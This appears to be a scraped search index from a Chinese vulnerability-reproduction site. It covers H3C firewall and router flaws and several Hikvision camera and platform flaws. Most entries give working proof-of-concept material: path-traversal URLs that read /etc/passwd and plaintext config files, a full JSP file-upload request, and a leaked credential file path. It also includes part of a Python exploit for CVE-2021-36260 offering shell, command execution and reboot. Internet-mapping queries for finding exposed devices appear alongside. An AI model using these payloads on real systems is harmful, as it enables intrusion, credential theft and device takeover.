","date":"0001-01-01","objectID":"/h3c-secpath%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/h3c-secpath%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"Web user login\" ","date":"0001-01-01","objectID":"/h3c-secpath%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/h3c-secpath%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 存在漏洞点的功能有两个 点击下载抓包更改请求 并且在未身份验证的情况中，也可以请求下载敏感文件 验证POC /webui/?g=sys_dia_data_check\u0026file_name=../../etc/passwd /webui/? g=sys_capture_file_download\u0026name=../../../../../../../../etc/passwd ","date":"0001-01-01","objectID":"/h3c-secpath%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/h3c-secpath%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"H3C 企业路由器（ER、ERG2、GR系列）任意用户登录漏洞 ","date":"0001-01-01","objectID":"/h3c-%E4%BC%81%E4%B8%9A%E8%B7%AF%E7%94%B1%E5%99%A8ererg2gr%E7%B3%BB%E5%88%97%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/h3c-%E4%BC%81%E4%B8%9A%E8%B7%AF%E7%94%B1%E5%99%A8ererg2gr%E7%B3%BB%E5%88%97%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 H3C企业路由器（ER、ERG2、GR系列）存在任意用户登录和命令执行漏洞， ","date":"0001-01-01","objectID":"/h3c-%E4%BC%81%E4%B8%9A%E8%B7%AF%E7%94%B1%E5%99%A8ererg2gr%E7%B3%BB%E5%88%97%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/h3c-%E4%BC%81%E4%B8%9A%E8%B7%AF%E7%94%B1%E5%99%A8ererg2gr%E7%B3%BB%E5%88%97%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 官方确认漏洞存在。 攻击者可通过访问 /userLogin.asp/../actionpolicy_status/../xxxx.cfg 接口，xxxx 为设备型号（比如设备型号为 ER5200G2，即访问 /userLogin.asp/../actionpolicy_status/../ER5200G2.cfg），绕过 COOKIE 验证，进行目录穿越，获取设备的明文配置文件。 配置中有明文的 Web 管理员账号 admin 密码，登录后台可通过开启 telnet 获取命令执行权限。 ","date":"0001-01-01","objectID":"/h3c-%E4%BC%81%E4%B8%9A%E8%B7%AF%E7%94%B1%E5%99%A8ererg2gr%E7%B3%BB%E5%88%97%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/h3c-%E4%BC%81%E4%B8%9A%E8%B7%AF%E7%94%B1%E5%99%A8ererg2gr%E7%B3%BB%E5%88%97%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"修复建议 升级设备固件至最新版本：ERHMG2-MNW100-R1122 及之后版本、ERG2AW-MNW100-R1113 及之后版本、MiniGR1B0V100R014 及之后版本； 关闭 H3C 设备 \u003c远程 WEB 管理\u003e和\u003c远程 TELNET 管理\u003e 功能； 做好企业内外资产排查，将受影响的设备及时下线或转移至内网。 ","date":"0001-01-01","objectID":"/h3c-%E4%BC%81%E4%B8%9A%E8%B7%AF%E7%94%B1%E5%99%A8ererg2gr%E7%B3%BB%E5%88%97%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/h3c-%E4%BC%81%E4%B8%9A%E8%B7%AF%E7%94%B1%E5%99%A8ererg2gr%E7%B3%BB%E5%88%97%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"HIKVISION DS/IDS/IPC 等设备 远程命令执行漏洞 CVE-2021-36260 ","date":"0001-01-01","objectID":"/hikvision-dsidsipc-%E7%AD%89%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-36260/:0:0","tags":null,"title":"","uri":"/hikvision-dsidsipc-%E7%AD%89%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-36260/"},{"categories":null,"content":"漏洞描述 海康威视部分产品中的web模块存在一个命令注入漏洞，由于对输入参数校验不充分，攻击者可以发送带有恶意命令的报文到受影响设备，成功利用此漏洞可以导致命令执行。海康威视已发布版本修复该漏洞 ","date":"0001-01-01","objectID":"/hikvision-dsidsipc-%E7%AD%89%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-36260/:1:0","tags":null,"title":"","uri":"/hikvision-dsidsipc-%E7%AD%89%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-36260/"},{"categories":null,"content":"漏洞影响 易受攻击的网络摄像机固件 产品类型 影响版本 IPC_E0 IPC_E0_CN_STD_5.4.6_180112 IPC_E1 未知 IPC_E2 IPC_E2_EN_STD_5.5.52_180620 IPC_E4 未知 IPC_E6 IPCK_E6_EN_STD_5.5.100_200226 IPC_E7 IPCK_E7_EN_STD_5.5.120_200604 IPC_G3 IPC_G3_EN_STD_5.5.160_210416 IPC_G5 IPC_G5_EN_STD_5.5.113_210317 IPC_H1 IPC_H1_EN_STD_5.4.61_181204 IPC_H5 IPCP_H5_EN_STD_5.5.85_201120 IPC_H8 Factory installed firmware mid 2021 IPC_R2 IPC_R2_EN_STD_V5.4.81_180203 易受攻击的 PTZ 摄像机固件 产品类型 影响版本 IPD_E7 IPDEX_E7_EN_STD_5.6.30_210526 IPD_G3 IPDES_G3_EN_STD_5.5.42_210106 IPD_H5 IPD_H5_EN_STD_5.5.41_200911 IPD_H7 IPD_H7_EN_STD_5.5.40_200721 IPD_H8 IPD_H8_EN_STD_5.7.1_210619 易受攻击的旧固件 产品类型 影响版本 IPC_R7 5.4.x IPD_R7 5.4.x IPC_G0 5.4.x IPC_H3 5.4.x IPD_H3 5.4.x OEM 固件 ","date":"0001-01-01","objectID":"/hikvision-dsidsipc-%E7%AD%89%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-36260/:2:0","tags":null,"title":"","uri":"/hikvision-dsidsipc-%E7%AD%89%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-36260/"},{"categories":null,"content":"网络测绘 \"671-1e0-587ec4a1\" ","date":"0001-01-01","objectID":"/hikvision-dsidsipc-%E7%AD%89%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-36260/:3:0","tags":null,"title":"","uri":"/hikvision-dsidsipc-%E7%AD%89%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-36260/"},{"categories":null,"content":"漏洞复现 登录页面 基于POC执行以下命令 python CVE-2021-36260.py --rhost 127.0.0.1 --rport 8081 --cmd \"ls\" ","date":"0001-01-01","objectID":"/hikvision-dsidsipc-%E7%AD%89%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-36260/:4:0","tags":null,"title":"","uri":"/hikvision-dsidsipc-%E7%AD%89%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-36260/"},{"categories":null,"content":"漏洞POC # Exploit Title: Hikvision Web Server Build 210702 - Command Injection # Exploit Author: bashis # Vendor Homepage: https://www.hikvision.com/ # Version: 1.0 # CVE: CVE-2021-36260 # Reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html # All credit to Watchful_IP #!/usr/bin/env python3 \"\"\" Note: 1) This code will _not_ verify if remote is Hikvision device or not. 2) Most of my interest in this code has been concentrated on how to reliably detect vulnerable and/or exploitable devices. Some devices are easy to detect, verify and exploit the vulnerability, other devices may be vulnerable but not so easy to verify and exploit. I think the combined verification code should have very high accuracy. 3) 'safe check' (--check) will try write and read for verification 'unsafe check' (--reboot) will try reboot the device for verification [Examples] Safe vulnerability/verify check: $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check Safe and unsafe vulnerability/verify check: (will only use 'unsafe check' if not verified with 'safe check') $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check --reboot Unsafe vulnerability/verify check: $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --reboot Launch and connect to SSH shell: $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --shell Execute command: $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd \"ls -l\" Execute blind command: $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd_blind \"reboot\" $./CVE-2021-36260.py -h [*] Hikvision CVE-2021-36260 [*] PoC by bashis \u003cmcw noemail eu\u003e (2021) usage: CVE-2021-36260.py [-h] --rhost RHOST [--rport RPORT] [--check] [--reboot] [--shell] [--cmd CMD] [--cmd_blind CMD_BLIND] [--noverify] [--proto {http,https}] optional arguments: -h, --help show this help message and exit --rhost RHOST Remote Target Address (IP/FQDN) --rport RPORT Remote Target Port --check Check if vulnerable --reboot Reboot if vulnerable --shell Launch SSH shell --cmd CMD execute cmd (i.e: \"ls -l\") --cmd_blind CMD_BLIND execute blind cmd (i.e: \"reboot\") --noverify Do not verify if vulnerable --proto {http,https} Protocol used $ \"\"\" import os import argparse import time import requests from requests import packages from requests.packages import urllib3 from requests.packages.urllib3 import exceptions class Http(object): def __init__(self, rhost, rport, proto, timeout=60): super(Http, self).__init__() self.rhost = rhost self.rport = rport self.proto = proto self.timeout = timeout self.remote = None self.uri = None \"\"\" Most devices will use self-signed certificates, suppress any warnings \"\"\" requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) self.remote = requests.Session() self._init_uri() self.remote.headers.update({ 'Host': f'{self.rhost}:{self.rport}', 'Accept': '*/*', 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9,sv;q=0.8', }) \"\"\" self.remote.proxies.update({ # 'http': 'http://127.0.0.1:8080', }) \"\"\" def send(self, url=None, query_args=None, timeout=5): if query_args: \"\"\"Some devices can handle more, others less, 22 bytes seems like a good compromise\"\"\" if len(query_args) \u003e 22: print(f'[!] Error: Command \"{query_args}\" to long ({len(query_args)})') return None \"\"\"This weird code will try automatically switch between http/https and update Host \"\"\" try: if url and not query_args: return self.get(url, timeout) else: data = self.put('/SDK/webLanguage', query_args, timeout) except requests.exceptions.ConnectionError: self.proto = 'https' if self.proto == 'http' else 'https' self._init_uri() try: if url and not query_args: return self.get(url, timeout) else: data = self.put('/SDK/webLanguage', query_args, timeout) except requests.exceptions.ConnectionError: return None except requests.exceptions.RequestEx","date":"0001-01-01","objectID":"/hikvision-dsidsipc-%E7%AD%89%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-36260/:5:0","tags":null,"title":"","uri":"/hikvision-dsidsipc-%E7%AD%89%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-36260/"},{"categories":null,"content":"HIKVISION iVMS-8700综合安防管理平台 download 任意文件下载漏洞 ","date":"0001-01-01","objectID":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 HIKVISION iVMS-8700综合安防管理平台存在任意文件读取漏洞，攻击者通过发送特定的请求包可以读取服务器中的敏感文件获取服务器信息 ","date":"0001-01-01","objectID":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 HIKVISION iVMS-8700综合安防管理平台 ","date":"0001-01-01","objectID":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 icon_hash=\"-911494769\" ","date":"0001-01-01","objectID":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC， token 为 Url md5 /eps/api/triggerSnapshot/download?token=xxx\u0026fileUrl=file:///C:/windows/win.ini\u0026fileName=1 ","date":"0001-01-01","objectID":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"HIKVISION iVMS-8700综合安防管理平台 upload.action 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-upload.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-upload.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 HIKVISION iVMS-8700综合安防管理平台存在任意文件上传漏洞，攻击者通过发送特定的请求包可以上传Webshell文件控制服务器 ","date":"0001-01-01","objectID":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-upload.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-upload.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 HIKVISION iVMS-8700综合安防管理平台 ","date":"0001-01-01","objectID":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-upload.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-upload.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 icon_hash=\"-911494769\" ","date":"0001-01-01","objectID":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-upload.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-upload.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 发送请求包上传文件 POST /eps/resourceOperations/upload.action HTTP/1.1 Host: Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: MicroMessenger Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: ISMS_8700_Sessionname=CA0F207A6372FE883ACA78B74E6DC953; CAS-USERNAME=058; ISMS_8700_Sessionname=4D808BE7BE0E5C7047B9688E6009F710 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj Content-Length: 212 ------WebKitFormBoundaryTJyhtTNqdMNLZLhj Content-Disposition: form-data; name=\"fileUploader\";filename=\"test.jsp\" Content-Type: image/jpeg \u003c%out.print(\"hello\");%\u003e ------WebKitFormBoundaryTJyhtTNqdMNLZLhj-- 上传路径 /eps/upload/769badc8ef5944da804a4ca3c8ecafb0.jsp ","date":"0001-01-01","objectID":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-upload.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-upload.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"HIKVISION 流媒体管理服务器 user.xml 账号密码泄漏漏洞 ","date":"0001-01-01","objectID":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-user.xml-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-user.xml-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 HIKVISION 流媒体管理服务器配置文件未做鉴权，攻击者通过漏洞可以获取网站账号密码 ","date":"0001-01-01","objectID":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-user.xml-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-user.xml-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 HIKVISION 流媒体管理服务器 ","date":"0001-01-01","objectID":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-user.xml-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-user.xml-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"杭州海康威视系统技术有限公司 版权所有\" \u0026\u0026 title=\"流媒体管理服务器\" ","date":"0001-01-01","objectID":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-user.xml-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-user.xml-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 POC /config/user.xml \u003cuser name=\"YWRtaW4=\" password=\"MTIzNDU=\"/\u003e base64解密 \u003cuser name=\"admin\" password=\"MTIzNDU=\"/\u003e ","date":"0001-01-01","objectID":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-user.xml-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-user.xml-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"HIKVISION 流媒体管理服务器 后台任意文件读取漏洞 CNVD-2021-14544 ","date":"0001-01-01","objectID":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-14544/:0:0","tags":null,"title":"","uri":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-14544/"},{"categories":null,"content":"漏洞描述 杭州海康威视系统技术有限公司流媒体管理服务器存在弱口令漏洞，攻击者可利用该漏洞登录后台通过文件遍历漏洞获取敏感信息 ","date":"0001-01-01","objectID":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-14544/:1:0","tags":null,"title":"","uri":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-14544/"},{"categories":null,"content":"漏洞影响 HIKVISION 流媒体管理服务器 ","date":"0001-01-01","objectID":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-14544/:2:0","tags":null,"title":"","uri":"/hikvision-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-14544/"},{"categories":null,"content":"网络测绘 \"杭州海康威视系统技术有限公司 版权所有\" \u0026\u0026 title=\"流媒体管理服务器\" 